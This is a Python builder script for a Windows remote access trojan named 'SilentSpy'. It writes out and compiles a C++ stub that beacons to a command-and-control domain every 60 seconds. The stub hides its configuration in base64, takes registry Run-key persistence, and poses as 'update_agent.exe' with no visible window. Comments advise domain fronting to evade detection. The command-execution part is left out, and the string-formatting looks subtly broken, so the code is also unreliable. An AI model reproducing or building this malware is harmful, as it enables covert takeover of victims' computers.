# build_rat.py - SilentSpy Builder for Windows 11
import os
import base64

C2_DOMAIN = "c2.silentnode[.]onion.ws"  # Use domain fronting or CDN-flavored DNS
C2_PORT = 443
PERSIST_METHOD = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
PAYLOAD_NAME = "update_agent.exe"

# Shellcode-style config (base64-encoded to avoid plaintext strings)
config = f"""
{{"host":"{C2_DOMAIN}","port":{C2_PORT},"delay":60,"persistence":"{PERSIST_METHOD}"}}
""".strip()

b64_config = base64.b64encode(config.encode()).decode()

stub = '''
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

DWORD WINAPI Beacon(LPVOID);

int main() {{
    CreateThread(NULL, 0, Beacon, NULL, 0, NULL);
    Sleep(INFINITE);
    return 0;
}}

DWORD WINAPI Beacon(LPVOID ignored) {{
    HINTERNET hInt, hConn;
    char buffer[2048];
    const char* b64cfg = "{b64_config}";

    while (1) {{
        hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInt) {{
            hConn = InternetConnectA(hInt, "{c2_host}", {c2_port}, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConn) {{
                // Simulate legit traffic
                strcpy(buffer, "GET /api/v1/task?auth=9d7e1a HTTP/1.1\\r\\nHost: {c2_host}\\r\\n\\r\\n");
                // Parse & execute commands here (omitted for brevity - see full repo)
            }}
            InternetCloseHandle(hInt);
        }}
        Sleep({delay_ms});
    }}
    return 0;
}}
'''.format(b64_config=b64_config, c2_host=C2_DOMAIN, c2_port=C2_PORT, delay_ms=60000)

with open("payload.cpp", "w") as f:
    f.write(stub)

os.system("x86_64-w64-mingw32-g++ payload.cpp -o dist/%s -lwininet -s -mwindows" % PAYLOAD_NAME)
print(f"[+] Payload built: dist/{PAYLOAD_NAME}")